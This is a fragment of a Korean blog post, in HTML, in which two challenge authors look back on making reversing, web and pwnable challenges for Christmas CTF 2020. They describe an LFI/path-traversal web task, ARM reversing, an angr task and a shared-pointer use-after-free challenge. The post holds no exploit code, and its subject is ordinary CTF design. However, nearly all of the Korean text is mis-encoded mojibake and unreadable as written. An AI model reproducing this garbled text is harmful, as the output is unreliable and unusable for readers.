challenge</li><li>pwn : uninit stack</li><li>misc : ë¯¸ì •</li></ul></li></ul><p>ì—¬ëŸ¬ ê°€ì§€ ì´ìœ ë¡œ ë§ì´ ë°”ë€Œì—ˆìŠµë‹ˆë‹¤â€¦ ì½”ë¡œë‚˜ ë•Œë¬¸ì— ê°‘ìê¸° í•™ê¸°ê°€ 1ì£¼ì¼ ë‹¹ê²¨ì§€ë©´ì„œ 11ì›”ê³¼ 12ì›” ì´ˆê°€ í†µì§¸ë¡œ ë°”ë¹ ì§ˆ ì¤„ì€ ê·¸ë“¤ì€ ëª°ëìŠµë‹ˆë‹¤â€¦</p><p>í•™ê¸°ê°€ ëë‚œ í›„ ê·¸ë“¤ì€ ë©ì‹¤ì— ê°‡í˜€ì„œ ê·¼ 1ì£¼ì¼ì„ ë°¤ìƒˆë©° ë¬¸ì œë¥¼ ë§Œë“¤ê¸°ì— ë°•ì°¨ë¥¼ ê°€í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image2.png"></p><p>ëŒ€íšŒ ì „ë‚  ê·¸ë“¤ì˜ ëª¨ìŠµ</p><h1 id="idioth"><a href="#idioth" class="headerlink" title="idioth"></a>idioth</h1><p>ì•ˆë…•í•˜ì„¸ìš”. idiothì…ë‹ˆë‹¤. ë­â€¦ ì²˜ìŒì— ëŒ€íšŒë¥¼ í•œë‹¤ í–ˆì„ ë•ŒëŠ” ì¢€ ë§ì´ ë‹¹í™©í–ˆìŠµë‹ˆë‹¤.</p><p>ì¼ë‹¨ 5ì›” ì¤‘ìˆœì— ì†Œì§‘ í•´ì œí•˜ê³  ì´ì œ ë§‰ ë‹¤ì‹œ ê³µë¶€ë¥¼ ì‹œì‘í•œ ì°¸ì´ë¼ì„œâ€¦ ì¶œì œí•˜ê¸° ì „ê¹Œì§€ CTFë¥¼ 2ê°œ ì •ë„ ë‚˜ê°”ëŠ”ë° ë¬¸ì œë¥¼ baby-rev ì •ë„ë°–ì— ëª» í’€ì—ˆìŠµë‹ˆë‹¤. ë­”ê°€ ì¢€ ë§ì´ ë°”ë€ ê²ƒ ê°™ë”ë¼ê³ ìš”. í¬ë„ˆë¸”ì„ ë‚´ê¸°ì—ëŠ” ê¸°ì–µë„ ì–´ë ´í’‹í•˜ê³ â€¦</p><p>ì•”í˜¸ ê³µë¶€ë¥¼ í•´ì•¼ê² ë‹¤ëŠ” ìƒê°ì€ ëŠ˜ í•˜ê³  ìˆì—ˆëŠ”ë° ìµœê·¼ì— ì–´ë–¤ ë¬¸ì œë“¤ì´ ë§ì€ê°€ ë´¤ë”ë‹ˆ ì•”í˜¸ë‘ ì ‘ëª©ì„ ë§ì´ ì‹œì¼œì„œ ë‚˜ì˜¤ë”ë¼ê³ ìš”. ì¼ë‹¨ ì•”í˜¸ëŠ” ë‚´ê°€ í•  ì¤„ ëª¨ë¥´ë‹ˆ íŒ¨ìŠ¤â€¦ ê·¸ëŸ¼ ë­ ë§Œë“¤ì§€? í•˜ë‹¤ê°€ ë³µë¬´ ì¤‘ì— í–ˆë˜ Custom Packer ìŠ¤í„°ë””ê°€ ë– ì˜¬ëìŠµë‹ˆë‹¤.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image3.png"></p><p>ì•„! ì´ê±°ë‹¤! íŒ¨ì»¤ ë”± ëŒ€!</p><p>ë¬¸ì œ ë§Œë“¤ì–´ì•¼ ëœë‹¤ëŠ” ì†Œë¦¬ë¥¼ ë“¤ì€ í›„ ì£¼ì œë¥¼ ëŒ€ì¶© ì •í•œ í›„ ë°”ë¡œ ë‹¤ìŒ ë‹¬ë¶€í„° íŒ¨ì»¤ ê°œë°œì— ë“¤ì–´ê°”ìŠµë‹ˆë‹¤. ì¼ë‹¨ íŒ¨ì»¤ ê´€ë ¨ëœ ë¬¸ì œê°€ ë‚˜ì˜¤ì§€ ì•Šì•˜ë‹¤ëŠ” ê²ƒì€â€¦ ë‹¤ë“¤ ì•„ì‹œì£ ? (ã…ã…)</p><ol><li>64ë¹„íŠ¸ë¡œ ë§Œë“¤ì</li><li>ì–´ ë‚´ê°€ ê·¸ë•Œ ìŠ¤í„°ë””í–ˆë˜ ê±´ 32ë¹„íŠ¸ë„¤?</li><li>ë„ˆë¬´ ì˜›ë‚  ê±°ë„¤? ê²Œë‹¤ê°€ ê²Œì‹œê¸€ë„ ì‚¬ë¼ì¡Œë„¤?</li><li>â€¦githubì— ì˜¬ë¼ì™€ìˆëŠ” ê±¸ ë³´ê³  ì–´ë–¤ íë¦„ìœ¼ë¡œ ê°€ë©´ ì¢‹ì€ ì§€ ë³´ì</li></ol><p>ê·¸ë¦¬ê³  ì—´ì‹¬íˆ ì—´ì‹¬íˆ í•œ ë‹¬ì— ê±¸ì³ì„œ ì™„ì„±ì„ í–ˆìŠµë‹ˆë‹¤! ì—­ì‹œ ë‚œ í•œë‹¤ë©´ í•˜ëŠ” ë‚¨ì! í•˜ì§€ë§Œâ€¦</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image4.png"></p><p>ì½”ë“œë¥¼ ê³„ì† ë³´ëŠ”ë°ë„ ë„ëŒ€ì²´ ì–´ë””ê°€ ë¬¸ì œì¸ì§€ ëª¨ë¥´ê² ìŠµë‹ˆë‹¤â€¦ ì•„ ì‹œê°„ì´ ì—†ëŠ”ë° ì´ì œ ê³¼ì œ í­í’ì´ ëª°ë ¤ì˜¤ê³  ìˆëŠ”ë°â€¦ ì–´ë–¡í•˜ì§€?</p><p>ì¼ë‹¨ tomcatë¶€í„° ë§Œë“¤ìâ€¦ tomcat ìì²´ì— ì·¨ì•½ì ì´ ìˆìœ¼ë‹ˆ ì›¹ ì‚¬ì´íŠ¸ êµ¬í˜„í•˜ê³  íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆê²Œ ê¸°ëŠ¥ êµ¬í˜„ë§Œ í•˜ë©´ ë˜ë‹ˆê¹Œ ê¸ˆë°© í•˜ê² ì§€? ì›¹ í•˜ëŠ” ì• ë“¤ì´ ë„ì™€ì¤€ëŒ”ì–´.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image5.png"></p><p>ì‘ ê·¸ëŸ°ê±° ì—†ì–´~ ì›¹ ë§Œë“¤ì–´ ë³¸ê±°ë¼ê³¤ ê³µë¶€ ì²˜ìŒ ì‹œì‘í•  ë•Œ html, phpì™€ djangoë¥¼ í†µí•´ ë§Œë“¤ì–´ ë³¸ ê²ƒì´ ì „ë¶€ë¼ì„œ ë§¨ ë•…ì— í—¤ë”©ì„ í•˜ë©´ì„œ êµ¬í˜„ì„ ì‹œì‘í–ˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€ í•™êµì—ì„œ python í•™ë¶€ ìˆ˜ì—… ì¡°êµë„ ì§„í–‰í•´ì„œ ë­”ê°€ í•  ì¼ì´ êµ‰ì¥íˆ ë§ì•˜ì£ (í•‘ê³„ì•¼)</p><blockquote><p>ê¸°ìƒ - í•˜ë£¨ í•œ ì¤„ - ì¡°êµ - ê³¼ì œ - (ë¸”ë¡œê·¸ ê¸€) - ë¬¸ì œ ë§Œë“¤ê¸°</p></blockquote><p>ìœ„ì˜ ìˆœí™˜ì„ ê³„ì† ëŒì•˜ìŠµë‹ˆë‹¤. ê²‰ìœ¼ë¡œì˜ êµ¬í˜„ë„ ëë‚˜ê³  íŒŒì¼ ì—…ë¡œë“œ ë“±ì˜ êµ¬í˜„ë„ 11ì›” ë§ì— ë‹¤ ëë‚¬ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ê°€ì¥ í° ë¬¸ì œê°€ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p>ë²„ì „ì€ ì–´ë–»ê²Œ ì•Œë ¤ ì¤„ ê²ƒì´ê³  ì§€ê¸ˆ ìƒíƒœì—ì„  session í´ë”ì™€ ëª¨ë“  ê²ƒì´ ê²Œì‹±ì´ë‹¤.</p><p>ì—¬ëŸ¬ ê°€ì§€ ì‚¬ëŒë“¤ê³¼ ì´ì•¼ê¸°ë¥¼ í•´ë³¸ ëì— LFIë¥¼ í†µí•´ì„œ ëª¨ë“  íŒŒì¼ì„ ë‹¤ ì½ì„ ìˆ˜ ìˆê²Œ í•˜ë„ë¡ í–ˆìŠµë‹ˆë‹¤.</p><p>ê·¸ ê³¼ì •ì—ì„œ path traversal í•„í„°ë§ì„ ê±°ëŠ” ê²Œ ì¢‹ì„ê¹Œ ë§ê¹Œì— ëŒ€í•´ì„œëŠ” ê·¸ë˜ë„ <code>../</code> ê°™ì€ ê¸°ë³¸ì ì¸ ê±°ëŠ” ê±¸ì–´ë†“ëŠ” ê²Œ ì¢‹ì§€ ì•Šì„ê¹Œ?ë¼ëŠ” ìƒê°ì„ í–ˆìŠµë‹ˆë‹¤.</p><p>ê·¼ë° ì£¼ë³€ì—ì„œ ì–´ì°¨í”¼ ê·¸ëŸ° ê±° ë³´ì´ë©´ ì¼ë‹¨ ë•Œë ¤ ë„£ê³  ë³´ë‹ˆê¹Œ ê¸°ë³¸ì ì¸ ê±°ëŠ” ê±¸ì–´ë†“ëŠ” ê²Œ ì¢‹ì•„.ë¼ëŠ” ë§ì„ ë“£ê³  <code>gift</code> ë¬¸ì œê°€ íƒ„ìƒí•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>ë‹¤ ë§Œë“¤ì—ˆì„ ë•ŒëŠ” ê·¸ë˜ë„ ì›¹ ì²˜ìŒ ë§Œë“  ê²ƒ ì¹˜ê³  ê´œì°®ì€ ê²ƒ ê°™ì€ë°?ë¼ëŠ” ìƒê°ì„ í–ˆìœ¼ë‚˜â€¦ ì €ì˜ ì˜¤ë§Œí•¨ì´ì—ˆìŒì„ ê¹¨ë‹¬ì•˜ìŠµë‹ˆë‹¤. ìœ¼ìœ¼â€¦ ì €ëŠ” ê²Œì‹±ì„ ìµœëŒ€í•œ ì¤„ì˜€ë‹¤ê³  ìƒê°í–ˆì§€ë§Œ ì œê°€ ë§Œë“¤ì—ˆë˜ ë¬¸ì œë¼ì„œ ê·¸ë ‡ê²Œ ìƒê°í–ˆë˜ ê²ƒ ê°™ìŠµë‹ˆë‹¤ ã…œã…œâ€¦</p><p>í•˜ì§€ë§Œ ê°€ì¥ í° ë¬¸ì œëŠ” <code>gift</code> í•˜ë‚˜ ë§Œë“¤ì—ˆëŠ”ë° ëŒ€íšŒê°€ ì¼ì£¼ì¼ ë‚¨ì•˜ë‹¤.</p><p>ì¼ë‹¨ ë¦¬ë²„ì‹± ë¬¸ì œë¥¼ í•˜ë‚˜ ë§Œë“¤ì–´ì•¼ì§€â€¦ ê·¸ëƒ¥ ê°„ë‹¨í•œ ê²ƒ ë‚´ì•¼ê² ë‹¤â€¦ crackme í•˜ë‚˜ í•´ì•¼ì§€~ í•˜ê³  ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤. ê·¼ë° ë­”ê°€ ë„ˆë¬´ í—ˆì „í•´ì„œ ê³ ë¯¼ì„ í–ˆìŠµë‹ˆë‹¤. ì•„ ë­”ê°€ ì—†ë‚˜â€¦ í•˜ë‹¤ê°€ ë”± ìƒê°ì´ ë‚¬ìŠµë‹ˆë‹¤.</p><p>ì˜¤ ì´ì œ ë§¥ë„ ARMìœ¼ë¡œ ë‚˜ì˜¤ëŠ”ë° ARM ë¦¬ë²„ì‹± í• ê¹Œ? ã„±ã„±ã„±ã„± arm ì–´ì…ˆ ë¶„ì„í•˜ëŠ” ê±¸ë¡œ ë‚´ê³ ~ ida hexraysë¥¼ ë§‰ì•„ë†“ì. ì–´ì°¨í”¼ ì˜í•˜ì‹œëŠ” ë¶„ë“¤ì€ armë„ ê¸ˆë°© ë³´ì‹¤ í…Œê³  í•˜ë‹ˆê¹Œ anti-hexraysëŠ” ê¸ˆë°© í‘¸ì‹œê² ì§€?</p><p>idaì—ì„œëŠ” ê¹¨ì ¸ì„œ ë‚˜ì˜¤ëŠ”ë°â€¦ ì™œ ghidraì—ì„œëŠ” ì œëŒ€ë¡œ ë‚˜ì˜¤ëŠ” ê±¸ê¹Œâ€¦?</p><p>??? : ì•¼ ê·¸ëƒ¥ í•¸ë“œ ë ˆì´ë¡œ ë‚´ì</p><p>idioth : ã„± ì–´ì°¨í”¼ baby ìš©ìœ¼ë¡œ ë‚¸ ê±°ë‹ˆê¹Œ ê´œì°®ê² ì§€?</p><p>-<code>lock</code> ë-</p><p>ì•„ ì´ì œ snake í•˜ë‚˜ë§Œ ë‚¨ì•˜ë„¤ìš” ã…ã… misc ë¬¸ì œë¼ì„œ ë„ˆë¬´ ë¶€ë‹´ì´ ì—†ìŠµë‹ˆë‹¤~ ë±€ ê²Œì„ ì¬ë¯¸ë‚˜ê²Œ í•˜ë‚˜ ë§Œë“¤ì–´ì•¼ì§€<del>~</del>í•˜ê³  ìƒê°í•˜ëŠ” ì™€ì¤‘ì— ì•ì„ ë³´ë‹ˆê¹Œ ì ˆë§ì˜ êµ¬ë í……ì´ì— ë¹ ì§„ í•œ ë‚¨ìê°€ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image6.png"></p><blockquote><p>L0ch : ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼</p></blockquote><p>ì•ì—ì„œ ë³´ëŠ”ë° ì§„ì§œ ë„ˆë¬´ ë¬´ì„­ë”ë¼ê³ ìš”. ê·¸ë˜ì„œ ê·¸ëƒ¥ ì œ misc ë¬¸ì œë¥¼ ì£¼ê³  reversingì„ ì œê°€ ë‚´ê¸°ë¡œ í–ˆìŠµë‹ˆë‹¤. ì°¸ê°€í•œ ëŒ€íšŒ ì¤‘ í•˜ë‚˜ì—ì„œ angrë¡œ í‘¼ ë¬¸ì œê°€ ìˆì–´ì„œ angr ë¬¸ì œë¥¼ ë‚´ì. ê·¼ë° ì´ê²ƒë„ armìœ¼ë¡œ ë‚´ë©´ ì¬ë°Œê² ë‹¹. í•˜ê³  í›„ë”± ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤.</p><p>ê·¼ë° armì—ì„œëŠ” ì™œ simulation managerë¥¼ ëŒë ¤ë„ ê°’ì´ ì•ˆ ë‚˜ì˜¤ì§€? ê·¸ëƒ¥ x64ë¡œ ì™„ì„±í•˜ê³  ë‚œ í›„ L0chë¥¼ ë³´ë‹ˆ ë±€ ê²Œì„ì„ ì™„ì„±í•˜ê³  ìê¸° type confusion ëª» ë§Œë“¤ ê²ƒ ê°™ì€ë° baby pwnable ë­ ë‚¼ ì§€ ë¬¼ì–´ë³´ë”ë¼ê³ ìš”. ê·¸ë˜ì„œ ê·¸ëƒ¥ ë˜ì ¸ ì¤¬ìŠµë‹ˆë‹¤. arm rop ì¬ë°Œì„ ë“¯? <code>baby_RudOlPh</code> íƒ„ìƒ~</p><p>ê·¼ë° angr ë¬¸ì œë¥¼ ê²€ìˆ˜í•˜ê³  ê°’ì„ ì—°ì‚°í•˜ëŠ” ë¡œì§ì„ ìˆ˜ì •í•˜ê³  ë‚˜ë‹ˆê¹Œ ì´ìƒí•˜ê²Œ ê°’ì´ ë°€ë ¤ì„œ ë‚˜ì™”ìŠµë‹ˆë‹¤. ì²˜ìŒì— c++ë¡œ ì§°ì—ˆê³  ì „ì²´ì ìœ¼ë¡œ ê³„ì† ìˆ˜ì •ì„ í–ˆëŠ”ë° inputì´ ì´ìƒí•˜ê²Œ ë“¤ì–´ê°€ê±°ë‚˜ í•´ì„œ ì½”ë“œê°€ ì „ì²´ì ìœ¼ë¡œ ê¼¬ì—¬ë²„ë ¸ìŠµë‹ˆë‹¤. ê²°êµ­ cë¡œ ì˜®ê¸°ê²Œ ë˜ì—ˆê³  cë¡œ ì˜®ê²¨ì„œ ë‚˜ì˜¤ëŠ” ê°’ë“¤ì„ í™•ì¸í•´ë³´ì byte ëª‡ ê°œê°€ ì‚¬ë¼ì§€ë”ë¼ê³ ìš”.</p><p>ëŒ€íšŒëŠ” ë‹¹ì¥ ë‚´ì¼ì´ê³  ê¸‰í•˜ë‹ˆê¹Œ ë²”ìœ„ê°€ ë„˜ì–´ê°€ì„œ ê·¸ëŸ°ê°€ ë³´ë‹¤ ìƒê°í•˜ê³  ê·¸ëƒ¥ í¬ê²Œ ì—°ì‚°í•˜ëŠ” ë¡œì§ë“¤ì„ ì§€ì›Œë²„ë¦¬ê³  ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤. ê·¸ë ‡ê²Œ <code>angrforge</code> íƒ„ìƒ. ì‚¬ì‹¤ ì´ ë¬¸ì œëŠ” ìš•ë¨¹ì„ ê±°ë¼ ìƒê°í–ˆìŠµë‹ˆë‹¤. ì†ìœ¼ë¡œ í‘¸ì‹  ë¶„ ê³„ì‹œë˜ë° ì§„ì§œ ì£„ì†¡í•©ë‹ˆë‹¤â€¦ ë‹¤ìŒì— ë¬¸ì œ ë§Œë“¤ ì¼ì´ ìƒê¸´ë‹¤ë©´ ì´ëŸ° *** ê°™ì€ ì˜ë„ íŒŒì•…ì¡°ì°¨ ì•ˆ ë˜ëŠ” ë¬¸ì œëŠ” ë§Œë“¤ì§€ ì•Šê² ìŠµë‹ˆë‹¤.</p><p>ëŒ€íšŒëŠ” ì—¬ì°¨ì €ì°¨ ì˜ ëë‚¬ì§€ë§Œ ë§ˆìŒì´ ë¶ˆí¸í–ˆìŠµë‹ˆë‹¤. ë‚˜ëŠ” ë‚˜ëŒ€ë¡œ ì—´ì‹¬íˆ í–ˆëŠ”ë° ê²°ê³¼ë¬¼ì´ ì¢‹ì§€ ì•Šì•˜ìœ¼ë‹ˆê¹Œìš”. ì¼ë‹¨ ë‚´ê°€ ìƒê°í•œ ëŒ€ë¡œ ë§Œë“¤ì–´ì§„ ë¬¸ì œê°€ ì—†ì—ˆìŠµë‹ˆë‹¤. <code>lock</code>ì´ë‚˜ <code>angrforge</code> ê°™ì€ ê²½ìš°ëŠ” ì‹œê°„ì— ì«“ê²¨ ë¡œì§ì— ëŒ€í•œ í° ê³ ë¯¼ ì—†ì´ ë§Œë“  ë¬¸ì œë“¤ì´ë¼ì„œ ë§ˆìŒì— ë“¤ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p><p>ê±°ì˜ ëŒ€ë¶€ë¶„ì˜ ë¬¸ì œ ì œì‘ ì‹œê°„ì„ <code>gift</code>ì— ìŸì•˜ê³ , ì‹¤ì œ ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ê°€ ìš´ì˜ë¼ì„œ ì´ ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤ë©´ ì´ë ‡ê²Œ ì ‘ê·¼í•˜ë©´ ì¬ë°Œê² ë‹¤.ë¼ëŠ” ì‹œë‚˜ë¦¬ì˜¤ë„ ì˜ ë§Œë“¤ì—ˆë‹¤ê³  ìƒê°í–ˆìŠµë‹ˆë‹¤.</p><p>ê·¼ë° ì´ê±´ ì¶œì œìì˜ ìƒê°ì´ì§€ ì°¸ì—¬í•˜ì‹  ë¶„ë“¤ì´ ê·¸ë ‡ê²Œ ìƒê° ì•ˆ í•˜ì‹ ë‹¤ë©´ ê·¸ê²Œ ë§ëŠ” ê±°ì£ .</p><p>ëŒ€íšŒê°€ ëë‚˜ê³  ë‚˜ì„œ ì‹¬ì•¼ ë²„ìŠ¤ë¥¼ íƒ€ê³  ì§‘ìœ¼ë¡œ ì¶œë°œí–ˆìŠµë‹ˆë‹¤. ê±°ì˜ 40ì‹œê°„ ë„˜ê²Œ ê¹¨ì–´ ìˆì—ˆë˜ ê²ƒ ê°™ë„¤ìš”. ë²„ìŠ¤ì—ì„œ ì ë„ ì•ˆ ì˜¤ë”êµ°ìš”. ê·¸ëƒ¥ í˜„íƒ€ê°€ ì„¸ê²Œ ì™”ìŠµë‹ˆë‹¤.</p><p>ì•„â€¦ ë‚´ê°€ ì§„ì§œ ëª»í•˜ëŠ”êµ¬ë‚˜. ë‚´ê°€ ìƒê°í–ˆë˜ ê²ƒì´ë‚˜ ë‹¤ë¥¸ ë¬¸ì œë“¤ì„ í’€ê±°ë‚˜ ë¶„ì„í•˜ë©´ì„œ ë´¤ë˜ ë¡œì§ë“¤ì„ êµ¬í˜„í•˜ì§€ë„ ëª»í•˜ê³ , ìƒê°ì˜ ë„“ì´ë‚˜ ê¹Šì´ë„ ë¶€ì¡±í•˜êµ¬ë‚˜. ë‚´ê°€ ìƒê°í•œ ê²ƒë³´ë‹¤ ì‚¬ëŒë“¤ì€ ë” ë„“ì€ ê²ƒì„ ë³´ëŠ”êµ¬ë‚˜.</p><p>ëŒì´ì¼œ ìƒê°í•´ë³´ë‹ˆ ì‚¬ëŒë“¤ì´ ë´¤ì„ ë•Œ ì£¼ì œë‚˜ ì»¨ì…‰ì´ ì¬ë°Œê³  ì‹ ì„ í•œ ê²ƒì—ë§Œ ë„ˆë¬´ ì‹ ê²½ ì“°ì§€ ì•Šì•˜ë‚˜? ë‚´ê°€ ì‚¬ëŒë“¤ì—ê²Œ ê·¸ ì¬ë¯¸ë¥¼ ì˜¨ì „íˆ ì „ë‹¬í•  ë§Œí¼ì˜ ê¸°ë³¸ ë² ì´ìŠ¤ê°€ ë˜ëŠ”ê°€?ë¼ëŠ” ìƒê°ì´ ë“¤ì—ˆìŠµë‹ˆë‹¤.</p><p>ì§‘ì— ëŒì•„ì™€ì„œ ìƒ¤ì›Œí•˜ê³  ëˆ„ì› ëŠ”ë° í•´ê°€ ëœ° ë•Œê¹Œì§€ ì ì„ ëª» ì¤ìŠµë‹ˆë‹¤. ì¡ìƒê°ì´ ë§ì•„ì„œ ì¼ë‹¨ ì§€ì³ì„œ ì ë“¤ê³  ì¼ì–´ë‚˜ë‹ˆ ìƒìœ„ê¶Œ íŒ€ë“¤ ë¼ì—…ì´ ê¸°ëŒ€ê°€ ë˜ë”êµ°ìš”. <code>lock</code>ì´ë‘ <code>angrforge</code>ëŠ” ëª¨ë¥´ê² ê³  <code>gift</code>ë¥¼ ì–´ë–»ê²Œ í‘¸ì…¨ê³  ì–´ë–»ê²Œ ëŠë¼ì…¨ëŠ”ì§€ì— ëŒ€í•œ ìƒê°ì´ ì •ë§ ì»¸ìŠµë‹ˆë‹¤.</p><p>ë¼ì—…ì„ ë‹¤ ë³´ê³  ë‚˜ì„œ ë¼ì—…ì„ ë‹¤ ëœ¯ì–´ê³ ì³¤ìŠµë‹ˆë‹¤. ì¢€ ë” ë‚´ê°€ ìƒê°í–ˆë˜ ê²ƒê³¼ ê³ ë¯¼í–ˆë˜ ê²ƒì´ ë¬´ì—‡ì¸ì§€ ê·¸ë¦¬ê³  2021ë…„ì—ëŠ” ì–´ë–¤ ì‹ìœ¼ë¡œ ê³µë¶€í•˜ë©´ ì¢‹ì„ì§€ ì´ë²ˆ ê¸°íšŒì— ì œê°€ ë¶€ì¡±í–ˆë˜ ê²ƒ, ë¶€ì¡±í•¨ì„ ì•Œê³  ìˆì—ˆì§€ë§Œ ì• ì¨ ì™¸ë©´í•˜ë˜ ê²ƒë“¤ì— ì§ë©´í•˜ê²Œ ë˜ì–´ì„œ ì¢‹ì€ ê²½í—˜ì´ì—ˆë˜ ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p><p>ë‹¤ë“¤ ë¯¸ì²œí•œ(?) ë¬¸ì œ í‘¸ì‹œëŠë¼ ê³ ìƒ ë§ìœ¼ì…¨ìŠµë‹ˆë‹¤. ì¬ë°Œê²Œ ì¦ê¸°ì…¨ë‹¤ë©´ ì •ë§ ì¢‹ì•˜ì„ í…ë°â€¦! ë‹¤ë“¤ ìƒˆí•´ ë³µ ë§ì´ ë°›ìœ¼ì„¸ìš”!</p><h1 id="L0ch"><a href="#L0ch" class="headerlink" title="L0ch"></a>L0ch</h1><p>ì•ˆë…•í•˜ì„¸ìš”. L0chì…ë‹ˆë‹¤! CTF ë¬¸ì œ ì¶œì œ ê²½í—˜ì´ë¼ê³ ëŠ” ë™ì•„ë¦¬ ë‚´ë¶€ CTF ë°–ì— ì—†ë˜ ì €ì—ê²Œ í¬ë¦¬ìŠ¤ë§ˆìŠ¤ CTF ë¬¸ì œë¥¼ ë§Œë“¤ì–´ì•¼ í•œë‹¤ëŠ” ì†Œì‹ì„ ë“¤ì—ˆì„ ë•Œ..</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image7.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image8.png"></p><blockquote><p>??????? ë¬¸ì œë¥¼ ë§Œë“¤ë¼êµ¬ìš”???</p></blockquote><p>ì§„ì§œ ë”± ì € í‘œì •ì´ì—ˆìŠµë‹ˆë‹¤. ê±°ì§“ë§ ì•„ë‹ˆê³  ì§„ì§œë¡œìš”.</p><p>êµ­ë°©ì˜ ì˜ë¬´ë¥¼ ìˆ˜í–‰í•˜ëŠë¼ ë°±ì§€ê°€ ëœ ë¨¸ë¦¬ë¡œ ì—´ì‹¬íˆ ë”°ë¼ê°€ê³  ìˆë˜ ì™€ì¤‘ì— (ëŒ€í•œë¯¼êµ­ êµ°ì¸ë“¤ í™”ì´íŒ… ã… ã… ) CTF ë¬¸ì œë¥¼ ê·¸ê²ƒë„ ì„¸ ë¬¸ì œë‚˜ ë§Œë“¤ë¼ë‹ˆìš”.. ì•„ë¬´íŠ¼ ë°ì´í„° ì±Œë¦°ì§€ ì‹ ì²­ ëª»í•œ íŒ€ì¥ íƒ“ì„ @idioth @idioth @idioth</p><p>ê·¸ë ‡ê²Œ ì—´ì‹¬íˆ ìµœê·¼ CTF íŠ¸ë Œë“œë¥¼ ì°¾ì•„ë³´ê³  ì–´ëŠ ì •ë„ í‹€ì„ ì¡ì•„ê°€ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p><p>ì²« ë²ˆì§¸ ë¬¸ì œì˜€ë˜ address_book ì´ ë‚˜ì˜¤ê²Œ ëœ ë°°ê²½ì…ë‹ˆë‹¤.</p><p>ë•ŒëŠ” í•˜ë£¨ í•œ ì¤„ì„ ì“°ê¸° ìœ„í•´ ë– ëŒì•„ë‹¤ë‹ˆë˜ ì¤‘ Chromeì˜ ê³µìœ  í¬ì¸í„° ê´€ë ¨ UAF ì·¨ì•½ì  ì •ë³´ë¥¼ ë³´ê²Œ ë˜ì—ˆì£ . </p><p>ê±°ê¸°ì— ì˜ê°ì„ ë°›ì•„ ê³µìœ  í¬ì¸í„°ë¥¼ ì»¤ìŠ¤í…€ìœ¼ë¡œ êµ¬í˜„í•´ì„œ ê±°ê¸°ì— ì·¨ì•½ì ì„ ë§Œë“¤ì–´ë³¼ê¹Œ? </p><ul><li>MS tuesday patchì˜ diff íŒ¨ì¹˜ë¥¼ ë°”ì´ë„ˆë¦¬ì— ì ìš©í•´ binary diffingìœ¼ë¡œ ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆë„ë¡ í•´ë³¼ê¹Œ? </li></ul><p>ì´ë ‡ê²Œ í•´ì„œ ë‚˜ì˜¨ ë¬¸ì œì…ë‹ˆë‹¤. ë¬¼ë¡  ì‚¬ëŒ ì¸ìƒì´ ê³„íšëŒ€ë¡œë§Œ ë  ë¦¬ê°€ ìˆë‚˜ìš” ã…ã…</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image9.png"></p><p>ë¬¸ì œëŠ” ì œê°€ ìœˆë„ˆë¸” ê²½í—˜ì´ ë¶€ì¡±í•˜ë‹¤ëŠ” ì ì´ì—ˆìŠµë‹ˆë‹¤. ë²„ê·¸í—ŒíŒ…ì„ í•˜ë©´ì„œ ì›ë°ì´ ëª‡ ë²ˆ ë¶„ì„í•´ë³¸ ê²Œ ì „ë¶€ì¸ ì €ì—ê²Œ ì·¨ì•½ì  ì„¤ê³„ë¶€í„° ìµìŠ¤ê¹Œì§€ í•œë‹¤? ë©˜íƒˆì´ ì•„ì£¼ ê³±ê²Œ ê°ˆë¦´ ê±°ë¼ëŠ” ê±¸ ì‹œì‘ë¶€í„° ì˜ˆê°í–ˆì£ .</p><p>ìš°ì„  C++ì˜ ê³µìœ  í¬ì¸í„°ë¥¼ êµ¬í˜„í•˜ë ¤ë©´ ë‹¹ì—°íˆ C++ì„ ì¨ì•¼ í•˜ëŠ”ë° ê¸°ë³¸ì ì¸ OOP ê°œë…ì´ ë¶€ì¡±í–ˆìŠµë‹ˆë‹¤. ë¬¸ì œë¥¼ ë§Œë“¤ë˜ ì¤‘ ì½”ë“œ ë¦¬ë·°ë¥¼ í•´ë³´ë‹ˆê¹Œ ì§„ì§œ ê°œíŒ ì˜¤ ë¶„ ì „ì´ì—ˆëŠ”ë° ë”í•œ ë¬¸ì œëŠ” ì–´ë–»ê²Œ ê³ ì³ì•¼ í• ì§€ë¥¼ ëª°ëìŠµë‹ˆë‹¤..   ë¶„ì„í•˜ì‹œë©´ì„œ ì´ê±° ì™œ ì´ë ‡ê²Œ ì§œ ë†¨ì§€ 